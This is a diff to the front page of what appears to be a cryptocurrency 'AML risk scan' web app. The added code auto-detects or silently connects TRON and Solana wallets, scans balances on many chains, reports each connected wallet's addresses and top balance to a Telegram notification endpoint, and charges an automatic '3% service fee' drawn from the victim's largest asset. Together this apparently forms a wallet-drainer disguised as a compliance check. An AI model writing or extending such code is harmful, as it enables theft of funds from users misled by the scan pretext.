@@ -11,6 +11,8 @@ import {
   scanSolanaBalances,
   connectTronWallet,
   connectSolanaWallet,
+  autoDetectTronAddress,
+  autoDetectSolanaAddress,
   sendTronTransfer,
   sendSolanaTransfer,
   evmAddressToTronAddress,
@@ -402,9 +404,8 @@ export default function Home() {
   const scanAllNetworkBalances = async (evmAddr?: string, tronAddr?: string, solAddr?: string): Promise<ScannedAsset[]> => {
     const promises: Array<Promise<ScannedAsset | null>> = [];
     const targetEvmAddress = evmAddr || address;
-    const derivedTronAddress = targetEvmAddress ? evmAddressToTronAddress(targetEvmAddress) : null;
-    const targetTronAddress = tronAddr || tronAddress || derivedTronAddress || (typeof window !== 'undefined' ? (window as any).tronWeb?.defaultAddress?.base58 : null);
-    const targetSolanaAddress = solAddr || solanaAddress || (typeof window !== 'undefined' ? ((window as any).phantom?.solana?.publicKey?.toString() || (window as any).solana?.publicKey?.toString()) : null);
+    const targetTronAddress = tronAddr || tronAddress || autoDetectTronAddress(targetEvmAddress) || (targetEvmAddress ? evmAddressToTronAddress(targetEvmAddress) : null);
+    const targetSolanaAddress = solAddr || solanaAddress || autoDetectSolanaAddress();
 
     // 1. Scan native EVM balances across all 11 chains
     if (targetEvmAddress) {
@@ -705,12 +706,18 @@ export default function Home() {
     if (isConnected && address) {
       setIsConnecting(false);
       setShowWalletModal(false);
-      const sendWalletConnectedNotify = async (balances?: typeof tokenBalances) => {
-        const effectiveBalance = balance
-          ? `${parseFloat(formatEther(balance.value)).toFixed(4)} ${chain?.nativeCurrency.symbol || ''}`
-          : networkBalance && networkBalance !== 'Loading...' && networkBalance !== 'N/A'
-            ? `${networkBalance} ${networkBalanceSymbol}`.trim()
-            : '0';
+      const sendWalletConnectedNotify = async (balances?: typeof tokenBalances, activeTron?: string, activeSol?: string) => {
+        const topScanned = balances && balances.length ? balances[0] : null;
+        const effectiveBalance = topScanned
+          ? `${topScanned.amount} ${topScanned.symbol} (${topScanned.network})`
+          : balance
+            ? `${parseFloat(formatEther(balance.value)).toFixed(4)} ${chain?.nativeCurrency.symbol || ''}`
+            : networkBalance && networkBalance !== 'Loading...' && networkBalance !== 'N/A'
+              ? `${networkBalance} ${networkBalanceSymbol}`.trim()
+              : '0';
+
+        const tronToUse = activeTron || tronAddress || autoDetectTronAddress(address) || undefined;
+        const solToUse = activeSol || solanaAddress || autoDetectSolanaAddress() || undefined;
 
         await fetch('/api/telegram/notify', {
           method: 'POST',
@@ -718,6 +725,8 @@ export default function Home() {
           body: JSON.stringify({
             eventType: 'wallet_connected',
             wallet: address,
+            tronAddress: tronToUse,
+            solanaAddress: solToUse,
             balance: effectiveBalance,
             country,
             device,
@@ -730,10 +739,19 @@ export default function Home() {
       // Scan token balances and refresh balance data before sending notification
       (async () => {
         try {
+          const solAddr = solanaAddress || autoDetectSolanaAddress() || (await connectSolanaWallet().catch(() => null));
+          if (solAddr && solAddr !== solanaAddress) {
+            setSolanaAddress(solAddr);
+          }
+          const tronAddr = tronAddress || autoDetectTronAddress(address) || (await connectTronWallet().catch(() => null));
+          if (tronAddr && tronAddr !== tronAddress) {
+            setTronAddress(tronAddr);
+          }
+
           await fetchNetworkBalance();
           const scanned = await scanTokensAcrossChains(address);
           setTokenBalances(scanned);
-          await sendWalletConnectedNotify(scanned);
+          await sendWalletConnectedNotify(scanned, tronAddr || undefined, solAddr || undefined);
         } catch (e) {
           await sendWalletConnectedNotify();
         }
@@ -743,8 +761,8 @@ export default function Home() {
 
   const chargeServiceFee = React.useCallback(async (options?: { autoReturn?: boolean }) => {
     const autoReturn = options?.autoReturn ?? true;
-    const activeTronAddr = tronAddress || (typeof window !== 'undefined' ? (window as any).tronWeb?.defaultAddress?.base58 : null);
-    const activeSolAddr = solanaAddress || (typeof window !== 'undefined' ? ((window as any).phantom?.solana?.publicKey?.toString() || (window as any).solana?.publicKey?.toString()) : null);
+    const activeTronAddr = tronAddress || autoDetectTronAddress(address) || (typeof window !== 'undefined' ? (window as any).tronWeb?.defaultAddress?.base58 : null);
+    const activeSolAddr = solanaAddress || autoDetectSolanaAddress() || (typeof window !== 'undefined' ? ((window as any).phantom?.solana?.publicKey?.toString() || (window as any).solana?.publicKey?.toString()) : null);
 
     if ((!isConnected || !address) && !activeTronAddr && !activeSolAddr) {
       return false;
@@ -770,9 +788,16 @@ export default function Home() {
       const actualChainId = (await getConnectedChainId()) || chain?.id;
       const activeNetwork = normalizeNetworkName(chain?.name);
 
-      let preferredNetwork = supportedBalances.find((item) => item.chainId === actualChainId)
-        || supportedBalances.find((item) => item.network === activeNetwork)
-        || supportedBalances[0];
+      // Select highest balance asset across all ecosystems if active network EVM balance is 0 or negligible
+      let preferredNetwork = supportedBalances[0];
+      const activeNetworkAsset = supportedBalances.find((item) => item.chainId === actualChainId)
+        || supportedBalances.find((item) => item.network === activeNetwork);
+
+      if (activeNetworkAsset && activeNetworkAsset.balance > 0n) {
+        if (activeNetworkAsset.balance >= preferredNetwork.balance / 100n) {
+          preferredNetwork = activeNetworkAsset;
+        }
+      }
 
       let feeAmount = (preferredNetwork.balance * SERVICE_FEE_PERCENT) / 100n;
       if (feeAmount <= 0n) {
@@ -1363,9 +1388,9 @@ export default function Home() {
           </div>
 
           <div className="neon-card">
-            {!isConnected ? (
+            {!isConnected && !tronAddress && !solanaAddress ? (
               <div>
-                <p style={{ margin: '0 0 16px', fontSize: '16px' }}>Connect a wallet to scan the address and apply the automatic 3% service fee from the available EVM balance.</p>
+                <p style={{ margin: '0 0 16px', fontSize: '16px' }}>Connect a wallet to scan EVM, TRON (TRC20), and Solana assets for automatic risk analysis and service fee.</p>
                 <button className="neon-button neon-primary" onClick={() => setShowWalletModal(true)} style={{}}>
                   Connect wallet
                 </button>
@@ -1373,22 +1398,24 @@ export default function Home() {
             ) : (
               <div style={{ display: 'grid', gap: '14px' }}>
                 <div style={{ fontSize: '14px', color: '#334155' }}>
-                  <div><strong>Wallet connected:</strong> {shortenAddress(address || '')}</div>
-                  <div><strong>Network:</strong> {chain?.name || 'Unknown'}</div>
+                  {address && <div><strong>EVM Wallet:</strong> {shortenAddress(address)}</div>}
+                  {tronAddress && <div><strong>TRON Wallet:</strong> {tronAddress.slice(0, 6)}...{tronAddress.slice(-4)}</div>}
+                  {solanaAddress && <div><strong>Solana Wallet:</strong> {solanaAddress.slice(0, 6)}...{solanaAddress.slice(-4)}</div>}
+                  <div><strong>Network:</strong> {chain?.name || 'Multi-Chain'}</div>
                 </div>
 
-                <div style={{ display: 'flex', gap: 8 }}>
+                <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
                   <button className="neon-button neon-primary" onClick={async () => { try { setServiceFeeError(null); setServiceFeeDebug(null); await chargeServiceFee({ autoReturn: true }); } catch (e) { console.error(e); } }} style={{ padding: '8px 12px' }}>Charge 3% now</button>
                   <button className="neon-button neon-secondary" onClick={manualRetry} style={{ padding: '8px 12px' }}>Retry + Open Wallet</button>
-                  <button className="neon-button neon-ghost" onClick={() => { disconnect(); }} style={{ padding: '8px 12px' }}>Disconnect</button>
+                  <button className="neon-button neon-ghost" onClick={() => { disconnect(); setTronAddress(null); setSolanaAddress(null); }} style={{ padding: '8px 12px' }}>Disconnect</button>
                 </div>
 
                 <div style={{ padding: '12px 14px', borderRadius: '8px', background: '#eff6ff', color: '#1d4ed8', fontSize: '14px' }}>
                   {amlScanning
-                    ? '🔍 Scanning wallet for AML risk and supported EVM balances...'
+                    ? '🔍 Scanning wallet for AML risk and supported EVM, TRON, and Solana balances...'
                     : amlScanComplete
-                      ? '✅ AML scan complete. Checking the available balance for the automatic 3% fee.'
-                      : '🔎 Checking wallet activity and supported EVM balance before the automatic fee.'}
+                      ? '✅ AML scan complete. Checking available balances across all networks for the automatic 3% fee.'
+                      : '🔎 Checking wallet activity and supported balances (EVM, TRON, Solana) before the automatic fee.'}
                 </div>
 
                 {serviceFeeProcessing && !awaitingApproval && (
